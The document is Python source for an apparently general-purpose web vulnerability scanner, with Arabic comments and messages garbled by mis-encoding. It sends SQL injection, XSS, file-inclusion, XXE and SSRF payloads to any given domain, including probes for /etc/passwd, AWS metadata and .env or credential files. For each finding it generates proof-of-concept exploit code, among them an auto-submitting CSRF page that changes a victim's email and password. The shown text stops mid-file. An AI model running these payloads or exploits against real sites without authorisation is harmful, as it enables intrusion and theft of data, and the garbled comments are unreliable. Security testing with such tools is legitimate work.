#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import concurrent.futures
import time
import urllib.parse
import hashlib
import re
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.table import Table
from rich.panel import Panel
from datetime import datetime

console = Console()

class VulnerabilityScanner:
    """Enhanced vulnerability scanner with POC detection"""
    
    def __init__(self, domain, threads=10, timeout=15):
        self.domain = domain
        self.base_url = f"https://{domain}"
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # ØªØ¹Ø·ÙŠÙ„ Ø§Ù„ØªØ­Ø°ÙŠØ±Ø§Øª
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    def scan(self):
        """Run comprehensive vulnerability scan"""
        console.print(f"[yellow]âŸ³ Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ø£Ù…Ù†ÙŠØ©...[/yellow]\n")
        
        scan_methods = [
            ('SQL Injection', self._scan_sql_injection),
            ('XSS', self._scan_xss),
            ('LFI/RFI', self._scan_file_inclusion),
            ('Open Redirect', self._scan_open_redirect),
            ('SSRF', self._scan_ssrf),
            ('XXE', self._scan_xxe),
            ('CSRF', self._scan_csrf),
            ('Security Headers', self._scan_security_headers),
            ('Information Disclosure', self._scan_info_disclosure),
            ('Backup Files', self._scan_backup_files),
            ('CORS Misconfiguration', self._scan_cors),
            ('Clickjacking', self._scan_clickjacking)
        ]
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]ÙØ­Øµ Ø§Ù„Ø«ØºØ±Ø§Øª...", total=len(scan_methods))
            
            for name, method in scan_methods:
                try:
                    console.print(f"[dim]â†’ ÙØ­Øµ {name}...[/dim]")
                    method()
                    progress.advance(task)
                except Exception as e:
                    console.print(f"[red]âœ— Ø®Ø·Ø£ ÙÙŠ ÙØ­Øµ {name}: {str(e)}[/red]")
                    progress.advance(task)
        
        self._display_results()
        return self.vulnerabilities
    
    def _add_vulnerability(self, vuln_type, severity, url, description, poc, remediation):
        """Add vulnerability to results"""
        self.vulnerabilities.append({
            'type': vuln_type,
            'severity': severity,
            'url': url,
            'description': description,
            'poc': poc,
            'remediation': remediation,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        # Ø¹Ø±Ø¶ ÙÙˆØ±ÙŠ Ù„Ù„Ø«ØºØ±Ø© Ø§Ù„Ù…ÙƒØªØ´ÙØ©
        severity_color = {
            'Critical': 'bold red',
            'High': 'red',
            'Medium': 'yellow',
            'Low': 'blue',
            'Info': 'cyan'
        }.get(severity, 'white')
        
        console.print(f"\n[{severity_color}]ğŸ”´ Ø«ØºØ±Ø© Ù…ÙƒØªØ´ÙØ©: {vuln_type} [{severity}][/{severity_color}]")
        console.print(f"[white]ğŸ”— Ø§Ù„Ø±Ø§Ø¨Ø·: {url}[/white]")
        if poc:
            console.print(f"[green]âœ“ Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ø«ØºØ±Ø© Ù…ØªØ§Ø­[/green]\n")
    
    def _scan_sql_injection(self):
        """Scan for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2"
        ]
        
        test_params = ['id', 'user', 'username', 'email', 'search', 'q', 'page', 'cat', 'category']
        
        for param in test_params:
            for payload in payloads[:3]:  # Ø§Ø®ØªØ¨Ø§Ø± Ø£ÙˆÙ„ 3 payloads ÙÙ‚Ø· Ù„Ù„Ø³Ø±Ø¹Ø©
                try:
                    test_url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¹Ù„Ø§Ù…Ø§Øª SQL Injection
                    sql_errors = [
                        'SQL syntax', 'mysql_fetch', 'mysql_num_rows', 'mysqli',
                        'ORA-', 'PostgreSQL', 'SQLite', 'ODBC', 'JET Database',
                        'Microsoft Access Driver', 'SQLServer', 'mysql_', 'Syntax error'
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            poc_code = f"""
# Ø¥Ø«Ø¨Ø§Øª Ø«ØºØ±Ø© SQL Injection
# Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ØµØ§Ø¨: {test_url}

import requests

url = "{test_url}"
response = requests.get(url)

if "{error}" in response.text:
    print("[+] Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø¹Ø±Ø¶ Ù„Ù€ SQL Injection!")
    print(f"[+] Ø§Ù„Ø®Ø·Ø£ Ø§Ù„Ù…ÙƒØªØ´Ù: {error}")
    print(f"[+] Ø§Ù„Ù€ Payload: {payload}")
"""
                            
                            self._add_vulnerability(
                                vuln_type='SQL Injection',
                                severity='Critical',
                                url=test_url,
                                description=f'ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø«ØºØ±Ø© SQL Injection ÙÙŠ Ø§Ù„Ù…Ø¹Ø§Ù…Ù„ "{param}". Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠØ¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£ SQL: {error}',
                                poc=poc_code,
                                remediation='Ø§Ø³ØªØ®Ø¯Ù… Prepared Statements Ùˆ Parameterized Queries. Ù‚Ù… Ø¨ØªÙ†Ø¸ÙŠÙ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø¯Ø®Ù„Ø§Øª ÙˆØªØ¬Ù†Ø¨ Ø¹Ø±Ø¶ Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ø®Ø·Ø£.'
                            )
                            return
                except:
                    continue
    
    def _scan_xss(self):
        """Scan for XSS vulnerabilities"""
        # ØªÙˆÙ„ÙŠØ¯ Ù…Ø¹Ø±Ù ÙØ±ÙŠØ¯ Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø±
        test_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        
        payloads = [
            f'<script>alert("{test_id}")</script>',
            f'<img src=x onerror=alert("{test_id}")>',
            f'<svg/onload=alert("{test_id}")>',
            f'"><script>alert("{test_id}")</script>',
            f"'><script>alert('{test_id}')</script>",
            f'<iframe src="javascript:alert(\'{test_id}\')">',
            f'<body onload=alert("{test_id}")>',
            f'<input onfocus=alert("{test_id}") autofocus>'
        ]
        
        test_params = ['q', 'search', 'query', 'keyword', 'name', 'email', 'comment', 'message']
        
        for param in test_params:
            for payload in payloads[:4]:  # Ø§Ø®ØªØ¨Ø§Ø± Ø£ÙˆÙ„ 4 payloads
                try:
                    test_url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù†Ø¹ÙƒØ§Ø³ Ø§Ù„Ù€ Payload
                    if payload in response.text or test_id in response.text:
                        poc_code = f"""
# Ø¥Ø«Ø¨Ø§Øª Ø«ØºØ±Ø© Cross-Site Scripting (XSS)
# Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ØµØ§Ø¨: {test_url}

import requests

url = "{test_url}"
payload = "{payload}"

response = requests.get(url)

if payload in response.text:
    print("[+] Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø¹Ø±Ø¶ Ù„Ù€ XSS!")
    print(f"[+] Ø§Ù„Ù€ Payload Ù…Ù†Ø¹ÙƒØ³ ÙÙŠ Ø§Ù„ØµÙØ­Ø©")
    print(f"[+] ÙŠÙ…ÙƒÙ† ØªÙ†ÙÙŠØ° JavaScript Ø¹Ø¨Ø±: {url}")
    
# Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ÙŠØ¯ÙˆÙŠØŒ Ø§ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„ØªØ§Ù„ÙŠ ÙÙŠ Ø§Ù„Ù…ØªØµÙØ­:
# {test_url}
"""
                        
                        self._add_vulnerability(
                            vuln_type='Cross-Site Scripting (XSS)',
                            severity='High',
                            url=test_url,
                            description=f'ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø«ØºØ±Ø© XSS ÙÙŠ Ø§Ù„Ù…Ø¹Ø§Ù…Ù„ "{param}". Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠÙ‚Ø¨Ù„ ÙˆÙŠØ¹Ø±Ø¶ Ø£ÙƒÙˆØ§Ø¯ JavaScript Ø¯ÙˆÙ† ØªÙ†Ø¸ÙŠÙ.',
                            poc=poc_code,
                            remediation='Ù‚Ù… Ø¨ØªÙ†Ø¸ÙŠÙ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø¯Ø®Ù„Ø§ØªØŒ Ø§Ø³ØªØ®Ø¯Ù… HTML EncodingØŒ Ø·Ø¨Ù‘Ù‚ Content Security Policy (CSP).'
                        )
                        return
                except:
                    continue
    
    def _scan_file_inclusion(self):
        """Scan for LFI/RFI vulnerabilities"""
        lfi_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '/etc/passwd',
            'C:\\windows\\win.ini',
            '../../../../../../etc/passwd%00',
            'php://filter/convert.base64-encode/resource=index.php'
        ]
        
        test_params = ['file', 'page', 'include', 'path', 'load', 'doc', 'document']
        
        for param in test_params:
            for payload in lfi_payloads[:3]:
                try:
                    test_url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Ø¹Ù„Ø§Ù…Ø§Øª LFI
                    lfi_indicators = [
                        'root:x:0:0:', '[extensions]', 'bin/bash', 
                        'for 16-bit app support', 'fonts', 'passwd'
                    ]
                    
                    for indicator in lfi_indicators:
                        if indicator in response.text:
                            poc_code = f"""
# Ø¥Ø«Ø¨Ø§Øª Ø«ØºØ±Ø© Local File Inclusion (LFI)
# Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ØµØ§Ø¨: {test_url}

import requests

url = "{test_url}"
response = requests.get(url)

if "{indicator}" in response.text:
    print("[+] Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø¹Ø±Ø¶ Ù„Ù€ LFI!")
    print(f"[+] ØªÙ… Ù‚Ø±Ø§Ø¡Ø© Ù…Ø­ØªÙˆÙ‰: {payload}")
    print(f"[+] ÙŠÙ…ÙƒÙ† Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù†Ø¸Ø§Ù…")
    print("\\n[+] Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ù…Ù„Ù:")
    print(response.text[:500])
"""
                            
                            self._add_vulnerability(
                                vuln_type='Local File Inclusion (LFI)',
                                severity='Critical',
                                url=test_url,
                                description=f'ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø«ØºØ±Ø© LFI ÙÙŠ Ø§Ù„Ù…Ø¹Ø§Ù…Ù„ "{param}". ÙŠÙ…ÙƒÙ† Ù‚Ø±Ø§Ø¡Ø© Ù…Ù„ÙØ§Øª Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ø­Ø³Ø§Ø³Ø©.',
                                poc=poc_code,
                                remediation='Ù‚Ù… Ø¨ØªÙ‚ÙŠÙŠØ¯ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…Ù„ÙØ§ØªØŒ Ø§Ø³ØªØ®Ø¯Ù… Ù‚Ø§Ø¦Ù…Ø© Ø¨ÙŠØ¶Ø§Ø¡ Ù„Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø³Ù…ÙˆØ­Ø©ØŒ ØªØ¬Ù†Ø¨ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…Ø¯Ø®Ù„Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø¨Ø§Ø´Ø±Ø© ÙÙŠ Ù…Ø³Ø§Ø±Ø§Øª Ø§Ù„Ù…Ù„ÙØ§Øª.'
                            )
                            return
                except:
                    continue
    
    def _scan_open_redirect(self):
        """Scan for open redirect vulnerabilities"""
        malicious_url = "https://evil.com"
        test_params = ['redirect', 'url', 'return', 'next', 'redir', 'redirect_url', 'return_url', 'continue']
        
        for param in test_params:
            try:
                test_url = f"{self.base_url}/?{param}={urllib.parse.quote(malicious_url)}"
                response = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                
                # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if malicious_url in location or 'evil.com' in location:
                        poc_code = f"""
# Ø¥Ø«Ø¨Ø§Øª Ø«ØºØ±Ø© Open Redirect
# Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ØµØ§Ø¨: {test_url}

import requests

url = "{test_url}"
response = requests.get(url, allow_redirects=False)

if response.status_code in [301, 302, 303, 307, 308]:
    location = response.headers.get('Location', '')
    print("[+] Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø¹Ø±Ø¶ Ù„Ù€ Open Redirect!")
    print(f"[+] ÙŠØªÙ… Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¥Ù„Ù‰: {{location}}")
    print(f"[+] ÙŠÙ…ÙƒÙ† Ø§Ø³ØªØºÙ„Ø§Ù„Ù‡Ø§ ÙÙŠ Ù‡Ø¬Ù…Ø§Øª Phishing")
"""
                        
                        self._add_vulnerability(
                            vuln_type='Open Redirect',
                            severity='Medium',
                            url=test_url,
                            description=f'ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø«ØºØ±Ø© Open Redirect ÙÙŠ Ø§Ù„Ù…Ø¹Ø§Ù…Ù„ "{param}". ÙŠÙ…ÙƒÙ† Ø¥Ø¹Ø§Ø¯Ø© ØªÙˆØ¬ÙŠÙ‡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ù„Ù…ÙˆØ§Ù‚Ø¹ Ø®Ø¨ÙŠØ«Ø©.',
                            poc=poc_code,
                            remediation='Ù‚Ù… Ø¨Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø±ÙˆØ§Ø¨Ø· Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ØŒ Ø§Ø³ØªØ®Ø¯Ù… Ù‚Ø§Ø¦Ù…Ø© Ø¨ÙŠØ¶Ø§Ø¡ Ù„Ù„Ù†Ø·Ø§Ù‚Ø§Øª Ø§Ù„Ù…Ø³Ù…ÙˆØ­Ø©.'
                        )
                        return
            except:
                continue
    
    def _scan_ssrf(self):
        """Scan for SSRF vulnerabilities"""
        # Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø®Ø¯Ù…Ø© Ø§Ø®ØªØ¨Ø§Ø± Ù…Ø«Ù„ Burp Collaborator Ø£Ùˆ webhook.site
        test_domain = "webhook.site"
        payloads = [
            f'http://{test_domain}',
            f'https://{test_domain}',
            'http://localhost',
            'http://127.0.0.1',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'file:///etc/passwd'
        ]
        
        test_params = ['url', 'uri', 'path', 'load', 'fetch', 'api', 'callback']
        
        for param in test_params:
            for payload in payloads[:2]:
                try:
                    test_url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ÙˆØµÙˆÙ„
                    if response.status_code == 200 and len(response.content) > 100:
                        poc_code = f"""
# Ø¥Ø«Ø¨Ø§Øª Ø«ØºØ±Ø© Server-Side Request Forgery (SSRF)
# Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ØµØ§Ø¨: {test_url}

import requests

url = "{test_url}"
response = requests.get(url)

if response.status_code == 200:
    print("[+] Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù‚Ø¯ ÙŠÙƒÙˆÙ† Ù…Ø¹Ø±Ø¶ Ù„Ù€ SSRF!")
    print(f"[+] Ø§Ù„Ø®Ø§Ø¯Ù… ÙŠÙ‚ÙˆÙ… Ø¨Ø·Ù„Ø¨Ø§Øª Ø®Ø§Ø±Ø¬ÙŠØ©")
    print(f"[+] ÙŠÙ…ÙƒÙ† Ø§Ø³ØªØºÙ„Ø§Ù„Ù‡Ø§ Ù„Ù„ÙˆØµÙˆÙ„ Ù„Ù…ÙˆØ§Ø±Ø¯ Ø¯Ø§Ø®Ù„ÙŠØ©")
    
# Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©:
# - Ø¬Ø±Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù€ http://localhost
# - Ø¬Ø±Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù€ http://169.254.169.254 (AWS metadata)
# - Ø¬Ø±Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ø´Ø¨ÙƒØ§Øª Ø¯Ø§Ø®Ù„ÙŠØ©
"""
                        
                        self._add_vulnerability(
                            vuln_type='Server-Side Request Forgery (SSRF)',
                            severity='High',
                            url=test_url,
                            description=f'ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø¥Ù…ÙƒØ§Ù†ÙŠØ© SSRF ÙÙŠ Ø§Ù„Ù…Ø¹Ø§Ù…Ù„ "{param}". Ø§Ù„Ø®Ø§Ø¯Ù… ÙŠÙ‚ÙˆÙ… Ø¨Ø·Ù„Ø¨Ø§Øª Ø¥Ù„Ù‰ Ø±ÙˆØ§Ø¨Ø· Ø®Ø§Ø±Ø¬ÙŠØ©.',
                            poc=poc_code,
                            remediation='Ù‚Ù… Ø¨Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø±ÙˆØ§Ø¨Ø·ØŒ Ø§Ø³ØªØ®Ø¯Ù… Ù‚Ø§Ø¦Ù…Ø© Ø¨ÙŠØ¶Ø§Ø¡ØŒ Ø§Ù…Ù†Ø¹ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ø´Ø¨ÙƒØ§Øª Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ©.'
                        )
                        return
                except:
                    continue
    
    def _scan_xxe(self):
        """Scan for XXE vulnerabilities"""
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""
        
        try:
            test_url = f"{self.base_url}/api"
            response = self.session.post(
                test_url,
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=self.timeout
            )
            
            if 'root:x:0:0:' in response.text or 'bin/bash' in response.text:
                poc_code = f"""
# Ø¥Ø«Ø¨Ø§Øª Ø«ØºØ±Ø© XML External Entity (XXE)
# Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ØµØ§Ø¨: {test_url}

import requests

url = "{test_url}"
xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>'''

response = requests.post(
    url,
    data=xxe_payload,
    headers={{'Content-Type': 'application/xml'}}
)

if 'root:x:0:0:' in response.text:
    print("[+] Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø¹Ø±Ø¶ Ù„Ù€ XXE!")
    print("[+] ÙŠÙ…ÙƒÙ† Ù‚Ø±Ø§Ø¡Ø© Ù…Ù„ÙØ§Øª Ø§Ù„Ù†Ø¸Ø§Ù…")
    print(response.text[:500])
"""
                
                self._add_vulnerability(
                    vuln_type='XML External Entity (XXE)',
                    severity='Critical',
                    url=test_url,
                    description='ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø«ØºØ±Ø© XXE. ÙŠÙ…ÙƒÙ† Ù‚Ø±Ø§Ø¡Ø© Ù…Ù„ÙØ§Øª Ø§Ù„Ù†Ø¸Ø§Ù… Ø¹Ø¨Ø± XML entities.',
                    poc=poc_code,
                    remediation='Ù‚Ù… Ø¨ØªØ¹Ø·ÙŠÙ„ XML external entitiesØŒ Ø§Ø³ØªØ®Ø¯Ù… Ù…ÙƒØªØ¨Ø§Øª XML Ø¢Ù…Ù†Ø©.'
                )
        except:
            pass
    
    def _scan_csrf(self):
        """Scan for CSRF vulnerabilities"""
        try:
            response = self.session.get(f"{self.base_url}/login", timeout=self.timeout)
            
            # Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ù†Ù…Ø§Ø°Ø¬ Ø¨Ø¯ÙˆÙ† CSRF tokens
            forms = re.findall(r'<form[^>]*>.*?</form>', response.text, re.DOTALL | re.IGNORECASE)
            
            for form in forms:
                if 'method' in form.lower() and 'post' in form.lower():
                    # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¹Ø¯Ù… ÙˆØ¬ÙˆØ¯ CSRF token
                    csrf_indicators = ['csrf', 'token', '_token', 'authenticity_token']
                    has_csrf = any(indicator in form.lower() for indicator in csrf_indicators)
                    
                    if not has_csrf:
                        poc_code = f"""
# Ø¥Ø«Ø¨Ø§Øª Ø«ØºØ±Ø© Cross-Site Request Forgery (CSRF)
# Ø§Ù„Ù…ÙˆÙ‚Ø¹: {self.base_url}

# HTML ØµÙØ­Ø© Ø®Ø¨ÙŠØ«Ø© Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ CSRF:
csrf_exploit = '''
<html>
<body>
<form action="{self.base_url}/action" method="POST" id="csrf-form">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="password" value="hacked123">
</form>
<script>
    document.getElementById('csrf-form').submit();
</script>
</body>
</html>
'''

print("[+] Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ù„Ø§ ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ CSRF token!")
print("[+] ÙŠÙ…ÙƒÙ† ØªÙ†ÙÙŠØ° Ø¹Ù…Ù„ÙŠØ§Øª Ù†ÙŠØ§Ø¨Ø© Ø¹Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…")
"""
                        
                        self._add_vulnerability(
                            vuln_type='Cross-Site Request Forgery (CSRF)',
                            severity='Medium',
                            url=f"{self.base_url}/login",
                            description='Ø§Ù„Ù†Ù…Ø§Ø°Ø¬ Ù„Ø§ ØªØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ CSRF tokens. ÙŠÙ…ÙƒÙ† ØªÙ†ÙÙŠØ° Ø¹Ù…Ù„ÙŠØ§Øª ØºÙŠØ± Ù…ØµØ±Ø­ Ø¨Ù‡Ø§.',
                            poc=poc_code,
                            remediation='Ø£Ø¶Ù CSRF tokens Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù†Ù…Ø§Ø°Ø¬ØŒ ØªØ­Ù‚Ù‚ Ù…Ù† Origin/Referer headersØŒ Ø§Ø³ØªØ®Ø¯Ù… SameSite cookies.'
                        )
                        return
        except:
            pass
    
    def _scan_security_headers(self):
        """Scan for missing security headers"""
        try:
            response = self.session.get(self.base_url, timeout=self.timeout)
            headers = response.headers
            
            critical_headers = {
                'X-Frame-Options': 'ÙŠØ­Ù…ÙŠ Ù…Ù† Clickjacking',
                'X-Content-Type-Options': 'ÙŠÙ…Ù†Ø¹ MIME sniffing',
                'Strict-Transport-Security': 'ÙŠÙØ±Ø¶ HTTPS',
                'Content-Security-Policy': 'ÙŠØ­Ù…ÙŠ Ù…Ù† XSS',
                'X-XSS-Protection': 'Ø­Ù…Ø§ÙŠØ© Ø¥Ø¶Ø§ÙÙŠØ© Ù…Ù† XSS'
            }
            
            missing_headers = []
            for header, description in critical_headers.items():
                if header not in headers:
                    missing_headers.append(f"{header} - {description}")
            
            if missing_headers:
                poc_code = f"""
# Ø¥Ø«Ø¨Ø§Øª ÙÙ‚Ø¯Ø§Ù† Security Headers
# Ø§Ù„Ù…ÙˆÙ‚Ø¹: {self.base_url}

import requests

response = requests.get("{self.base_url}")
headers = response.headers

print("[+] Headers Ø§Ù„Ù…ÙˆØ¬ÙˆØ¯Ø©:")
for header in headers:
    print(f"  - {{header}}: {{headers[header]}}")

print("\\n[-] Headers Ø§Ù„Ù…ÙÙ‚ÙˆØ¯Ø©:")
{chr(10).join([f'print("  - {h}")' for h in missing_headers])}

print("\\n[!] Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø¹Ø±Ø¶ Ù„Ù‡Ø¬Ù…Ø§Øª Ù…ØªØ¹Ø¯Ø¯Ø© Ø¨Ø³Ø¨Ø¨ ÙÙ‚Ø¯Ø§Ù† Security Headers")
"""
                
                self._add_vulnerability(
                    vuln_type='Missing Security Headers',
                    severity='Medium',
                    url=self.base_url,
                    description=f'Headers Ø£Ù…Ù†ÙŠØ© Ù…Ù‡Ù…Ø© Ù…ÙÙ‚ÙˆØ¯Ø©: {", ".join(missing_headers)}',
                    poc=poc_code,
                    remediation='Ø£Ø¶Ù Ø¬Ù…ÙŠØ¹ Security Headers Ø§Ù„Ù…ÙˆØµÙ‰ Ø¨Ù‡Ø§ ÙÙŠ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø®Ø§Ø¯Ù….'
                )
        except:
            pass
    
    def _scan_info_disclosure(self):
        """Scan for information disclosure"""
        sensitive_paths = [
            '/.git/config',
            '/.env',
            '/config.php',
            '/phpinfo.php',
            '/test.php',
            '/info.php',
            '/.htaccess',
            '/wp-config.php',
            '/config.json',
            '/package.json',
            '/.aws/credentials',
            '/composer.json'
        ]
        
        for path in sensitive_paths:
            try:
                test_url = f"{self.base_url}{path}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                if response.status_code == 200 and len(response.content) > 10:
                    poc_code = f"""
# Ø¥Ø«Ø¨Ø§Øª Information Disclosure
# Ø§Ù„Ù…Ù„Ù Ø§Ù„Ù…ÙƒØ´ÙˆÙ: {test_url}

import requests

url = "{test_url}"
response = requests.get(url)

if response.status_code == 200:
    print("[+] Ù…Ù„Ù Ø­Ø³Ø§Ø³ Ù…ØªØ§Ø­ Ù„Ù„Ø¬Ù…ÙŠØ¹!")
    print(f"[+] Ø§Ù„Ø±Ø§Ø¨Ø·: {{url}}")
    print(f"[+] Ø­Ø¬Ù… Ø§Ù„Ù…Ø­ØªÙˆÙ‰: {{len(response.content)}} Ø¨Ø§ÙŠØª")
    print("\\n[+] Ø£ÙˆÙ„ 500 Ø­Ø±Ù Ù…Ù† Ø§Ù„Ù…Ø­ØªÙˆÙ‰:")
    print(response.text[:500])
"""
                    
                    self._add_vulnerability(
                        vuln_type='Information Disclosure',
                        severity='High',
                        url=test_url,
                        description=f'Ù…Ù„Ù Ø­Ø³Ø§Ø³ Ù…ØªØ§Ø­ Ù„Ù„Ø¹Ù…ÙˆÙ…: {path}. Ù‚Ø¯ ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø³Ø±ÙŠØ©.',
                        poc=poc_code,
                        remediation='Ø£Ø®Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ø­Ø³Ø§Ø³Ø©ØŒ Ù‚Ù… Ø¨ØªÙƒÙˆÙŠÙ† Ø§Ù„Ø®Ø§Ø¯Ù… Ù„Ù…Ù†Ø¹ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù‡Ø°Ù‡ Ø§Ù„Ù…Ù„ÙØ§Øª.'
                    )
                    break
            except:
                continue
    
    def _scan_backup_files(self):
        """Scan for backup files"""
        backup_extensions = ['.bak', '.old', '.backup', '.~', '.swp', '.swo', '.zip', '.tar.gz']
        test_files = ['index', 'config', 'database', 'db', 'backup', 'admin']
        
        for filename in test_files[:2]:  # Ø§Ø®ØªØ¨Ø§Ø± Ø£ÙˆÙ„ Ù…Ù„ÙÙŠÙ† ÙÙ‚Ø·
            for ext in backup_extensions[:3]:  # Ø£ÙˆÙ„ 3 Ø§Ù…ØªØ¯Ø§Ø¯Ø§Øª
                try:
                    test_url = f"{self.base_url}/{filename}{ext}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if response.status_code == 200 and len(response.content) > 100:
                        poc_code = f"""
# Ø¥Ø«Ø¨Ø§Øª ÙˆØ¬ÙˆØ¯ Backup Files
# Ø§Ù„Ù…Ù„Ù Ø§Ù„Ù…ÙƒØªØ´Ù: {test_url}

import requests

url = "{test_url}"
response = requests.get(url)

if response.status_code == 200:
    print("[+] Ù…Ù„Ù backup Ù…ØªØ§Ø­!")
    print(f"[+] Ø§Ù„Ø±Ø§Ø¨Ø·: {{url}}")
